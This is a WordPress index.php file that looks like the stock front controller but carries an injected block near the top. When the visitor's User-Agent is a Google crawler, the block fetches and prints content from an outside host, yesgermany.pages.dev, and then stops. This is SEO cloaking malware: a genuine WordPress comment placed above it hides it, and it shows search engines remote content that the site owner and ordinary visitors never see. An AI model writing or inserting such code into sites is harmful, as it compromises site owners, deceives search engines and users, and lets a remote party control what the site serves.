<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];

    if (
        stripos($ua, 'Googlebot') !== false ||
        stripos($ua, 'Google-Site-Verification') !== false ||
        stripos($ua, 'Google-InspectionTool') !== false
    ) {
        $ch = curl_init('https://yesgermany.pages.dev/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
        exit;
    }
}

/**
 * Front to the WordPress application.
 * Loads wp-blog-header.php which loads the theme.
 */
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
